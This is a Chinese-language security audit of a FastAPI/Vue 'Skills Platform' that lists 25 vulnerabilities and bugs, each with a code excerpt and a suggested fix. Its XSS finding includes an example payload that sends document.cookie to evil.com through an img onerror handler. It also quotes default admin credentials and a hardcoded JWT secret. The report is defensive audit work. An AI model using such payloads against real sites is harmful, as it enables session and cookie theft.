# 安全检查与 Bug 扫描报告

**扫描日期**: 2026-02-10
**扫描范围**: Skills Platform (Backend: FastAPI/Python, Frontend: Vue/TypeScript)
**扫描人员**: Claude Security Scanner

---

## 执行摘要

本报告对 Skills Platform 代码库进行了全面的安全检查和 Bug 扫描。共发现 **3 个严重问题**、**6 个高风险问题**、**8 个中风险问题** 和 **5 个低风险问题**。

### 风险分布

| 风险等级 | 数量 |
|---------|------|
| 严重 (Critical) | 3 |
| 高 (High) | 6 |
| 中 (Medium) | 8 |
| 低 (Low) | 5 |
| **总计** | **22** |

---

## 严重安全问题

### 1. 硬编码的 JWT Secret Key

**文件位置**: `backend/middleware/auth.py:18`

```python
SECRET_KEY = "your-secret-key-change-in-production"  # 生产环境从环境变量读取
```

**风险等级**: 严重

**问题描述**:
- JWT 签名密钥硬编码在源代码中
- 注释说明需要在生产环境更改，但代码实际并未从环境变量读取
- 攻击者可以使用此密钥伪造任意用户身份的 JWT Token

**修复建议**:
```python
import os
from dotenv import load_dotenv

load_dotenv()

SECRET_KEY = os.getenv("JWT_SECRET_KEY")
if not SECRET_KEY:
    raise ValueError("JWT_SECRET_KEY must be set in environment variables")
```

---

### 2. 加密密钥自动生成并打印到控制台

**文件位置**: `backend/core/security.py:35-40`

```python
if not key:
    # 如果没有配置密钥，生成一个新的
    key = Fernet.generate_key()
    print(f"Generated new encryption key: {key.decode()}")
    print("Please add this to your .env file: ENCRYPTION_KEY=" + key.decode())
```

**风险等级**: 严重

**问题描述**:
- 当 ENCRYPTION_KEY 未配置时，密钥会被生成并打印到标准输出
- 在生产环境中，日志可能被第三方日志收集系统捕获
- 如果密钥泄露，所有加密的 access token 和 webhook secret 都可被解密

**修复建议**:
```python
if not key:
    logger.error("ENCRYPTION_KEY environment variable must be set")
    raise ValueError(
        "ENCRYPTION_KEY must be set in environment variables. "
        "Generate one using: python -c 'from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())'"
    )
```

---

### 3. Webhook 签名验证缺失加密密钥解密

**文件位置**: `backend/api/webhooks.py:38-41`

```python
signature = request.headers.get('X-Gitlab-Token')
if repo.webhook_secret and signature != repo.webhook_secret:
    logger.warning(f"Invalid webhook signature for repository: {repo_id}")
    raise HTTPException(status_code=403, detail="Invalid signature")
```

**风险等级**: 严重

**问题描述**:
- `repo.webhook_secret` 是加密存储的，但在验证签名时未解密
- 这导致所有携带正确签名 webhook 请求都会被拒绝
- 更严重的是，这意味着 webhook 签名验证完全失效

**修复建议**:
```python
from core import encryption

signature = request.headers.get('X-Gitlab-Token')
if repo.webhook_secret:
    decrypted_secret = encryption.decrypt(repo.webhook_secret)
    if signature != decrypted_secret:
        logger.warning(f"Invalid webhook signature for repository: {repo_id}")
        raise HTTPException(status_code=403, detail="Invalid signature")
```

---

## 高风险安全问题

### 4. CORS 配置允许所有来源

**文件位置**: `backend/main.py:57-63`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # 生产环境应限制具体域名
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**风险等级**: 高

**问题描述**:
- CORS 配置允许来自任何域的请求
- 当 `allow_credentials=True` 时，`allow_origins=["*"]` 是不安全的组合
- 可能导致 CSRF 攻击和敏感数据泄露

**修复建议**:
```python
import os

allowed_origins = os.getenv("ALLOWED_ORIGINS", "").split(",")
if not allowed_origins:
    logger.warning("ALLOWED_ORIGINS not configured, using localhost only")
    allowed_origins = ["http://localhost:5173"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)
```

---

### 5. 前端 XSS 漏洞 - 未安全的 Markdown 渲染

**文件位置**: `frontend/src/views/Skill.vue:192-203`

```typescript
function renderMarkdown(content: string) {
  return content
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/`(.*?)`/g, '<code>$1</code>')
    .replace(/^### (.*$)/gim, '<h3>$1</h3>')
    .replace(/^## (.*$)/gim, '<h2>$1</h2>')
    .replace(/^# (.*$)/gim, '<h1>$1</h1>')
    .replace(/^\- (.*$)/gim, '<li>$1</li>')
    .replace(/\n/g, '<br>')
}
```

**使用位置**: `frontend/src/views/Skill.vue:93`
```vue
<div v-if="skill.content" class="markdown-content" v-html="renderMarkdown(skill.content)"></div>
```

**风险等级**: 高

**问题描述**:
- 使用 `v-html` 直接渲染未经充分净化的用户输入内容
- 自定义的 Markdown 渲染器只做了简单的正则替换，没有过滤 HTML 标签和 JavaScript
- 攻击者可以在 SKILL.md 中注入恶意脚本，窃取用户数据或进行钓鱼攻击

**攻击示例**:
```markdown
# Welcome
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```

**修复建议**:
```typescript
// 使用经过安全验证的 markdown 库
import { marked } from 'marked'
import DOMPurify from 'dompurify'

function renderMarkdown(content: string) {
  const rawHtml = marked(content)
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'code', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'a', 'blockquote', 'pre'],
    ALLOWED_ATTR: ['href', 'title']
  })
}
```

---

### 6. 登录信息明文显示在页面上

**文件位置**: `frontend/src/views/Login.vue:62-73`

```vue
<div class="credentials-hint">
  <p class="hint-title">默认账户信息</p>
  <div class="credential-item">
    <span class="credential-label">用户名:</span>
    <span class="credential-value">admin</span>
  </div>
  <div class="credential-item">
    <span class="credential-label">密码:</span>
    <span class="credential-value">Admin@123</span>
  </div>
</div>
```

**风险等级**: 高

**问题描述**:
- 默认管理员凭据直接显示在登录页面
- 任何访问系统的人都可以看到并使用这些凭据
- 如果这是生产环境，会导致系统被未授权访问

**修复建议**:
```vue
<!-- 仅在开发环境显示 -->
<div v-if="isDevelopment" class="credentials-hint">
  <!-- ... -->
</div>

<script setup>
const isDevelopment = import.meta.env.DEV
</script>
```

或者完全移除此功能，仅在首次部署时通过控制台或文档说明。

---

### 7. Webhook 日志端点无认证保护

**文件位置**: `backend/api/webhooks.py:67-89`

```python
@router.get("/logs")
async def get_webhook_logs(
    repo_id: int | None = None,
    limit: int = 100,
    db: AsyncSession = Depends(get_db)
):
    """获取 Webhook 日志"""
    webhook_service = get_webhook_service(db)
    logs = await webhook_service.get_webhook_logs(repo_id, limit)
    # ...
```

**风险等级**: 高

**问题描述**:
- Webhook 日志端点没有任何认证要求
- 任何人都可以访问 `/webhooks/logs` 查看所有 webhook 日志
- 日志中可能包含敏感信息（如 payload 内容、仓库信息等）

**修复建议**:
```python
@router.get("/logs")
async def get_webhook_logs(
    repo_id: int | None = None,
    limit: int = 100,
    current_user: User = Depends(get_current_user),  # 添加认证
    db: AsyncSession = Depends(get_db)
):
    # ...
```

---

### 8. 仓库同步端点权限检查不足

**文件位置**: `backend/api/repositories.py:240-255`

```python
@router.post("/{repo_id}/sync", response_model=SyncResponse)
async def sync_repository(
    repo_id: int,
    background_tasks: BackgroundTasks,
    current_user: User = Depends(get_current_user),  # 只需认证
    db: AsyncSession = Depends(get_db)
):
    """手动同步仓库"""
    repo = await db.get(Repository, repo_id)
    if not repo:
        raise NotFoundError("Repository", repo_id)

    scanner = SkillScanner(db)
    result = await scanner.sync_repository(repo)
    return SyncResponse(**result)
```

**风险等级**: 高

**问题描述**:
- 仓库同步操作只需要普通用户认证，不需要管理员权限
- 任何登录用户都可以触发同步操作，可能消耗大量服务器资源
- 同步操作会访问外部 Git 仓库，可能被滥用于端口扫描

**修复建议**:
```python
@router.post("/{repo_id}/sync", response_model=SyncResponse)
async def sync_repository(
    repo_id: int,
    background_tasks: BackgroundTasks,
    current_user: User = Depends(require_admin),  # 改为需要管理员权限
    db: AsyncSession = Depends(get_db)
):
    # ...
```

---

### 9. Token 过期时间过长

**文件位置**: `backend/middleware/auth.py:20`

```python
ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24  # 24小时
```

**风险等级**: 高

**问题描述**:
- JWT Token 有效期为 24 小时
- 如果 Token 被窃取，攻击者有 24 小时的窗口期进行恶意操作
- 没有实现 Token 刷新机制

**修复建议**:
```python
ACCESS_TOKEN_EXPIRE_MINUTES = 30  # 短期访问令牌 30 分钟
REFRESH_TOKEN_EXPIRE_DAYS = 7     # 刷新令牌 7 天

# 实现双 Token 机制：access_token (短期) + refresh_token (长期)
```

---

## 中风险安全问题

### 10. 数据库连接字符串默认值不安全

**文件位置**: `backend/database.py:15-18`

```python
DATABASE_URL = os.getenv(
    "DATABASE_URL",
    "mysql+aiomysql://root:password@localhost:3306/skills"
)
```

**风险等级**: 中

**问题描述**:
- 数据库连接字符串有默认值，包含常见密码 "password"
- 如果环境变量未正确配置，会使用不安全的默认凭据

**修复建议**:
```python
DATABASE_URL = os.getenv("DATABASE_URL")
if not DATABASE_URL:
    raise ValueError(
        "DATABASE_URL environment variable must be set. "
        "Example: mysql+aiomysql://user:password@localhost:3306/skills"
    )
```

---

### 11. 错误信息可能泄露敏感信息

**文件位置**: `backend/services/gitlab.py:278-284`

```python
except httpx.HTTPStatusError as e:
    error_msg = f"Failed to download tarball: HTTP {e.response.status_code}"
    if e.response.status_code == 401:
        if access_token:
            error_msg += ". The provided access token may be invalid or expired."
        else:
            error_msg += ". This may be a private repository. Please provide an access token."
    # ...
```

**风险等级**: 中

**问题描述**:
- 错误消息向用户透露了系统内部状态（access_token 是否存在）
- 可能被用于信息收集攻击

**修复建议**:
- 统一错误消息，避免泄露内部状态
- 只在日志中记录详细信息

---

### 12. SQL 查询使用原始字符串拼接

**文件位置**: `backend/api/categories.py:227-228`

```python
category_exists = await db.execute(
    text("SELECT 1 FROM categories WHERE id = :cat_id LIMIT 1"),
    {"cat_id": category_id}
)
```

**风险等级**: 中

**问题描述**:
- 虽然使用了参数化查询，但使用 `text()` 构造原始 SQL
- 如果代码维护不当，容易引入 SQL 注入漏洞
- 不如使用 SQLAlchemy ORM 的查询方式安全

**修复建议**:
```python
# 使用 ORM 方式
category_exists = await db.execute(
    select(Category).where(Category.id == category_id)
)
```

---

### 13. 密码强度验证可被绕过

**文件位置**: `backend/schemas/user.py:19-29`

```python
@field_validator('password')
@classmethod
def validate_password(cls, v: str) -> str:
    """验证密码强度"""
    if not re.search(r'[A-Z]', v):
        raise ValueError('Password must contain at least one uppercase letter')
    if not re.search(r'[a-z]', v):
        raise ValueError('Password must contain at least one lowercase letter')
    if not re.search(r'\d', v):
        raise ValueError('Password must contain at least one digit')
    return v
```

**风险等级**: 中

**问题描述**:
- 密码验证只检查大小写字母和数字，不要求特殊字符
- 没有检查常见弱密码
- 最小长度只有 8 位

**修复建议**:
```python
@field_validator('password')
@classmethod
def validate_password(cls, v: str) -> str:
    """验证密码强度"""
    if len(v) < 12:
        raise ValueError('Password must be at least 12 characters long')
    if not re.search(r'[A-Z]', v):
        raise ValueError('Password must contain at least one uppercase letter')
    if not re.search(r'[a-z]', v):
        raise ValueError('Password must contain at least one lowercase letter')
    if not re.search(r'\d', v):
        raise ValueError('Password must contain at least one digit')
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', v):
        raise ValueError('Password must contain at least one special character')

    # 检查常见弱密码
    common_passwords = ['password', '12345678', 'qwerty', 'admin', 'welcome']
    if v.lower() in common_passwords:
        raise ValueError('Password is too common')

    return v
```

---

### 14. 敏感信息在日志中记录

**文件位置**: `backend/api/repositories.py:166`

```python
logger.info(f"Successfully decrypted access token for {repo.full_name}")
```

**风险等级**: 中

**问题描述**:
- 虽然这个日志没有直接打印 token，但记录了 token 解密成功的消息
- 其他地方的日志可能包含更多敏感信息

**修复建议**:
- 审查所有日志语句，确保不记录敏感信息
- 使用日志级别控制敏感信息的输出

---

### 15. 敏感数据未从 API 响应中排除

**文件位置**: `backend/models/repository.py:42-58`

```python
def to_dict(self) -> dict:
    """转换为字典（用于 API 响应）"""
    return {
        "id": self.id,
        # ...
        "has_token": bool(self.access_token),
        "has_webhook_secret": bool(self.webhook_secret)
    }
```

**风险等级**: 中

**问题描述**:
- 虽然不直接返回 token，但暴露了是否有 token 的信息
- 攻击者可以利用此信息进行目标识别

**修复建议**:
- 对于敏感操作，完全避免暴露任何存在性信息
- 或者仅在管理员请求时显示

---

### 16. 前端路由守卫不检查 Token 有效性

**文件位置**: `frontend/src/router/index.ts:5-24`

```typescript
const guards = (to: any, from: any, next: any) => {
  const requiresAuth = to.meta.requiresAuth
  const requiresAdmin = to.meta.requiresAdmin

  const token = localStorage.getItem('token')
  const userRole = localStorage.getItem('userRole')

  if (requiresAuth && !token) {
    next({ name: 'login', query: { redirect: to.fullPath } })
    return
  }
  // ...
}
```

**风险等级**: 中

**问题描述**:
- 路由守卫只检查 token 是否存在，不验证其有效性
- 过期的 token 仍可通过前端路由守卫
- 依赖后端 API 调用返回 401 来处理过期，体验不佳

**修复建议**:
```typescript
// 解析 JWT 检查过期时间
function isTokenExpired(token: string): boolean {
  try {
    const payload = JSON.parse(atob(token.split('.')[1]))
    return payload.exp < Date.now() / 1000
  } catch {
    return true
  }
}

const guards = (to: any, from: any, next: any) => {
  const requiresAuth = to.meta.requiresAuth
  const token = localStorage.getItem('token')

  if (requiresAuth && (!token || isTokenExpired(token))) {
    localStorage.removeItem('token')
    localStorage.removeItem('userRole')
    next({ name: 'login', query: { redirect: to.fullPath } })
    return
  }
  // ...
}
```

---

### 17. 文件遍历攻击风险

**文件位置**: `backend/services/scanner.py:49-51`

```python
for root, dirs, files in os.walk(extract_dir):
    # 跳过隐藏目录
    dirs[:] = [d for d in dirs if not d.startswith('.')]
```

**风险等级**: 中

**问题描述**:
- 只跳过隐藏目录，没有防止符号链接攻击
- 恶意仓库可能包含符号链接指向系统敏感文件

**修复建议**:
```python
import os

for root, dirs, files in os.walk(extract_dir):
    # 跳过隐藏目录
    dirs[:] = [d for d in dirs if not d.startswith('.')]

    # 检查符号链接
    root_path = Path(root)
    if root_path.is_symlink():
        logger.warning(f"Skipping symlink directory: {root_path}")
        continue

    for filename in files:
        file_path = root_path / filename
        if file_path.is_symlink():
            logger.warning(f"Skipping symlink file: {file_path}")
            continue
```

---

## 低风险安全问题

### 18. 缺少速率限制保护

**文件位置**: `backend/middleware/security.py:107-142`

**问题描述**:
- 速率限制只配置了登录端点
- 其他敏感端点（如创建仓库、同步）没有速率限制

**修复建议**:
为更多端点添加速率限制：
```python
limits = {
    "/api/auth/login": (5, 60),
    "/api/admin/repositories": (10, 60),
    "/api/admin/repositories/*/sync": (3, 60),
    "/webhooks/gitlab/*": (100, 60),
}
```

---

### 19. 临时文件清理不完整

**文件位置**: `backend/services/github.py:98-101`

```python
finally:
    # 删除 ZIP 文件
    if zip_path.exists():
        zip_path.unlink()
```

**问题描述**:
- 只删除了 ZIP 文件，没有删除解压后的目录
- 临时目录可能积累占用磁盘空间

**修复建议**:
```python
import shutil
import tempfile

finally:
    if zip_path.exists():
        zip_path.unlink()
    if extract_dir.exists():
        shutil.rmtree(extract_dir)
```

---

### 20. 用户名大小写敏感可能导致重复用户

**文件位置**: `backend/models/user.py:24`

```python
username = Column(String(50), unique=True, nullable=False, index=True)
```

**问题描述**:
- 用户名是大小写敏感的，可能导致 "Admin" 和 "admin" 两个账户
- 容易造成用户混淆

**修复建议**:
- 存储时统一转换为小写
- 或使用数据库的 CITEXT 扩展

---

### 21. Session ID 使用预测性值

**文件位置**: `frontend/src/api/index.ts:23-24`

```typescript
this.token = localStorage.getItem('token')
```

**问题描述**:
- 使用 localStorage 存储敏感 Token
- localStorage 容易被 XSS 攻击窃取

**修复建议**:
- 考虑使用 httpOnly cookie 存储 token
- 或使用 sessionStorage（页面关闭后清除）

---

### 22. 错误处理不统一

**文件位置**: 多个文件

**问题描述**:
- 有些地方使用异常，有些返回错误码
- 错误消息格式不一致

**修复建议**:
- 统一使用自定义异常类
- 统一错误响应格式

---

## Bug 检查

### 23. Webhook 签名验证失效 (Bug)

**文件位置**: `backend/api/webhooks.py:39`

**问题**:
```python
if repo.webhook_secret and signature != repo.webhook_secret:
```

`repo.webhook_secret` 是加密存储的，直接比较字符串会失败。

**影响**: 所有配置了 webhook secret 的仓库都会拒绝合法的 webhook 请求。

---

### 24. 空值引用潜在问题 (Bug)

**文件位置**: `frontend/src/views/Home.vue:189`

```typescript
return flatCategories.value.find((item) => item.slug === selectedCategorySlug.value) || null
```

**问题**: 当 `selectedCategorySlug` 不存在于 `flatCategories` 时返回 `null`，后续代码可能没有处理这种情况。

**影响**: 可能导致页面显示错误或空白。

---

### 25. 类型转换错误 (Bug)

**文件位置**: `frontend/src/router/index.ts:18`

```typescript
if (requiresAdmin && userRole !== 'admin') {
    next({ name: 'home' })
    return
}
```

**问题**: `userRole` 从 localStorage 读取，始终是字符串。如果后端返回的角色名称格式不同（如大写 "ADMIN"），比较会失败。

**影响**: 合法的管理员可能被拒绝访问。

---

## 修复优先级建议

### 立即修复 (P0)

1. **硬编码 JWT Secret Key** - 修改为从环境变量读取
2. **Webhook 签名验证失效** - 修复加密密钥解密问题
3. **前端 XSS 漏洞** - 使用 DOMPurify 净化输出

### 高优先级 (P1)

4. CORS 配置过于宽松
5. 登录凭据明文显示
6. Webhook 日志端点无认证
7. Token 过期时间过长
8. 加密密钥生成问题

### 中优先级 (P2)

9. 数据库连接默认值
10. 密码强度验证
11. 仓库同步权限
12. 前端路由守卫改进

### 低优先级 (P3)

13. 临时文件清理
14. 速率限制扩展
15. 错误处理统一

---

## 总结

Skills Platform 的代码整体架构合理，使用了现代的安全实践（如密码加密、敏感数据加密、JWT 认证等），但仍存在一些关键的安全问题需要尽快修复：

1. **认证与授权**: JWT 密钥管理、Token 有效期需要改进
2. **输入验证**: 前端 XSS 防护需要加强
3. **访问控制**: 部分端点缺少适当的权限检查
4. **敏感数据处理**: 加密/解密流程存在 Bug

建议按优先级逐步修复这些问题，并在开发流程中引入自动化安全扫描工具。
